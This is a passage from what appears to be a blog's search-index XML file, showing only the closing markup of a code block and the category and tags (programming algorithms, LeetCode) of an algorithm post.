punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
